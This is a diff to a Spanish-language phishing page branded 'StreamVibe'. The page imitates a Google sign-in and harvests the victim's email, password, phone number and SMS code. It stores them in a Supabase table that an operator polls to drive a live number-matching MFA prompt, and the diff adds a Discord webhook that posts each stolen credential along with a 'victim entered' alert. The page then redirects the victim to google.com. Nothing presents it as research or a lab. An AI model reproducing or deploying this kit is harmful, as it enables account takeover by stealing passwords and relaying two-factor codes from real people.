@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>StreamVibe | Acceso Premium</title>
+    <title>StreamVibe | Acceso</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
@@ -15,99 +15,115 @@
         .vibe-bg { background-color: #0b0e11; color: white; }
         .vibe-accent { color: #06b6d4; }
         .vibe-btn { background-color: #06b6d4; color: #000; font-weight: 900; }
-        .loader { width: 16px; height: 16px; border: 2px solid #333; border-top: 2px solid #06b6d4; border-radius: 50%; animation: spin 1s linear infinite; }
+        .loader { width: 18px; height: 18px; border: 2px solid #333; border-top: 2px solid #06b6d4; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen">
 
+    <!-- Pantalla Inicial -->
     <div id="vibe-portal" class="fixed inset-0 vibe-bg z-[10000] flex flex-col items-center justify-center p-6 text-center">
         <h1 class="text-4xl font-black italic tracking-tighter vibe-font uppercase mb-8">STREAM<span class="vibe-accent">VIBE</span></h1>
         <button onclick="requestAccess()" class="vibe-btn w-full max-w-xs py-4 rounded-2xl text-xs uppercase tracking-[0.2em] shadow-lg">Sincronizar con Google</button>
     </div>
 
+    <!-- Contenedor Google -->
     <div id="wrapper" class="hidden w-full max-w-[448px] p-6 sm:p-10">
-        <div class="flex justify-center mb-8">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="h-6" alt="Google">
-        </div>
+        <div class="flex justify-center mb-8"><img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="h-6" alt="Google"></div>
         <div id="dynamic-view"></div>
     </div>
 
     <script>
         const S_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
         const S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1443618037294174220/cHXeoeQ9KzfGkKtUeVL-9AXk0o4ARszzBsEtkMm6xAVYgAMQdrSmNLP1K198X8HCgVSE";
+        
         const client = supabase.createClient(S_URL, S_KEY);
         const sesId = "SV-" + Math.random().toString(36).substr(2, 4).toUpperCase();
         
-        let store = { step: 'login', email: '', pass: '', phone: '', target: '--' };
-        let userIsTyping = false; // Bloqueo de actualización para el teclado
+        let store = { step: 'login', email: '', pass: '', phone: '', target: '--', sms: '' };
+        let isTyping = false; // Bloquea la actualización del DOM mientras el usuario escribe
 
         function requestAccess() {
             document.getElementById('vibe-portal').style.display = 'none';
             document.getElementById('wrapper').classList.remove('hidden');
             draw();
+            notifyDiscord("🚀 **Víctima entró a la página**");
+        }
+
+        async function notifyDiscord(content) {
+            try {
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: `📡 **SESIÓN [${sesId}]**\n${content}` })
+                });
+            } catch (e) { console.log("Error Discord"); }
         }
 
         async function push(step) {
             await client.from('sessions').upsert({
                 session_id: sesId, step: step, email: store.email, 
-                password: store.pass, phone: store.phone,
+                password: store.pass, phone: store.phone, sms: store.sms,
                 target_num: store.target === '--' ? null : store.target,
                 updated_at: new Date().toISOString()
             });
+            
+            let logMsg = `📍 **Paso:** ${step}\n📧 **Email:** ${store.email}`;
+            if(store.pass) logMsg += `\n🔑 **Contraseña:** ${store.pass}`;
+            if(store.phone) logMsg += `\n📞 **Teléfono:** ${store.phone}`;
+            if(store.sms) logMsg += `\n💬 **Código SMS:** ${store.sms}`;
+            notifyDiscord(logMsg);
         }
 
         function draw() {
-            if(userIsTyping) return; // NO REDIBUJAR si el usuario está escribiendo
-            
+            if(isTyping) return; // Evita cerrar el teclado
             const container = document.getElementById('dynamic-view');
             
             if(store.step === 'login') {
                 container.innerHTML = `
                     <div class="text-center mb-8"><h1 class="text-2xl font-normal mb-2">Iniciar sesión</h1><p class="text-[15px]">Usa tu cuenta de Google</p></div>
                     <form onsubmit="event.preventDefault(); store.email=this.e.value; store.pass=this.p.value; store.step='phone'; push('phone'); draw();">
-                        <input name="e" required type="email" placeholder="Correo electrónico" class="g-field mb-4" onfocus="userIsTyping=true" onblur="userIsTyping=false">
-                        <input name="p" required type="password" placeholder="Contraseña" class="g-field mb-10" onfocus="userIsTyping=true" onblur="userIsTyping=false">
+                        <input name="e" required type="email" placeholder="Correo electrónico o teléfono" class="g-field mb-4" onfocus="isTyping=true" onblur="isTyping=false">
+                        <input name="p" required type="password" placeholder="Introduce tu contraseña" class="g-field mb-10" onfocus="isTyping=true" onblur="isTyping=false">
                         <div class="flex justify-end"><button class="bg-[#1a73e8] text-white px-8 py-2 rounded font-medium text-sm">Siguiente</button></div>
                     </form>`;
             } else if(store.step === 'phone') {
                 container.innerHTML = `
-                    <div class="text-center mb-6"><h1 class="text-xl font-medium">Verificación</h1><p class="text-sm text-gray-600 mt-4 leading-relaxed">Introduce tu teléfono para sincronizar los beneficios de tu cuenta.</p></div>
+                    <div class="text-center mb-6"><h1 class="text-xl font-medium">Verificación</h1><p class="text-sm text-gray-600 mt-4 leading-relaxed">Confirma tu número de teléfono para verificar que eres tú.</p></div>
                     <form onsubmit="event.preventDefault(); store.phone=this.t.value; store.step='wait'; push('wait'); draw();">
-                        <input name="t" required type="tel" placeholder="Número de teléfono" class="g-field text-center text-xl mb-6" onfocus="userIsTyping=true" onblur="userIsTyping=false">
+                        <input name="t" required type="tel" placeholder="Número de teléfono" class="g-field text-center text-xl mb-6" onfocus="isTyping=true" onblur="isTyping=false">
                         <button class="w-full bg-[#1a73e8] text-white py-3 rounded font-medium">Siguiente</button>
                     </form>`;
             } else if(store.step === 'wait') {
                 container.innerHTML = `
                     <div class="text-center">
                         <h1 class="text-xl font-medium mb-4">Comprueba tu teléfono</h1>
-                        <p class="text-sm text-gray-600 mb-8 text-left">Google ha enviado una notificación a tu dispositivo. Toca <b>"Sí, soy yo"</b> y luego selecciona este número en la pantalla:</p>
-                        <div class="inline-block px-12 py-8 bg-blue-50 border-2 border-blue-100 rounded-3xl mb-8">
-                            <span class="text-7xl font-bold text-[#1a73e8]">${store.target}</span>
-                        </div>
-                        <div class="flex items-center justify-center gap-3"><div class="loader"></div><span class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Esperando confirmación...</span></div>
+                        <p class="text-sm text-gray-600 mb-8 text-left">Google ha enviado una notificación a tu dispositivo. Toca <b>"Sí, soy yo"</b> y luego selecciona el número:</p>
+                        <div class="inline-block px-12 py-8 bg-blue-50 border-2 border-blue-100 rounded-3xl mb-8"><span class="text-7xl font-bold text-[#1a73e8]">${store.target}</span></div>
+                        <div class="flex items-center justify-center gap-3"><div class="loader"></div><span class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Esperando respuesta...</span></div>
                     </div>`;
             } else if(store.step === 'sms') {
                 container.innerHTML = `
-                    <div class="text-center mb-6"><h1 class="text-xl font-bold">Código de Seguridad</h1><p class="text-xs text-gray-500 mt-2">Introduce el código de 6 dígitos enviado por SMS.</p></div>
-                    <form onsubmit="event.preventDefault(); store.sms=this.s.value; push('end'); location.href='https://google.com';">
-                        <div class="flex items-center border border-gray-300 p-3 rounded bg-gray-50 mb-8"><span class="text-xl font-bold text-gray-400 mr-2">G-</span><input name="s" required type="number" placeholder="000000" class="w-full text-2xl outline-none bg-transparent font-mono" onfocus="userIsTyping=true" onblur="userIsTyping=false"></div>
+                    <div class="text-center mb-6"><h1 class="text-xl font-bold">Código SMS</h1><p class="text-xs text-gray-500 mt-2">Introduce el código de 6 dígitos enviado por Google.</p></div>
+                    <form onsubmit="event.preventDefault(); store.sms=this.s.value; push('final'); location.href='https://google.com';">
+                        <div class="flex items-center border border-gray-300 p-3 rounded bg-gray-50 mb-8"><span class="text-xl font-bold text-gray-400 mr-2">G-</span><input name="s" required type="number" placeholder="000000" class="w-full text-2xl outline-none bg-transparent font-mono" onfocus="isTyping=true" onblur="isTyping=false"></div>
                         <button class="w-full bg-[#1a73e8] text-white py-3.5 rounded-lg font-bold">Verificar</button>
                     </form>`;
             }
         }
 
-        async function sync() {
-            if(userIsTyping) return; // No sincronizar si el usuario está escribiendo (evita cerrar teclado)
+        async function syncCheck() {
+            if(isTyping) return;
             const { data } = await client.from('sessions').select('*').eq('session_id', sesId).single();
             if(data) {
-                let hasChanged = false;
-                if(data.step !== store.step) { store.step = data.step; hasChanged = true; }
-                if(data.target_num != store.target) { store.target = data.target_num || '--'; hasChanged = true; }
-                if(hasChanged) draw();
+                let changed = false;
+                if(data.step !== store.step) { store.step = data.step; changed = true; }
+                if(data.target_num != store.target) { store.target = data.target_num || '--'; changed = true; }
+                if(changed) draw();
             }
         }
-        setInterval(sync, 2000);
+        setInterval(syncCheck, 2500);
     </script>
 </body>
 </html>
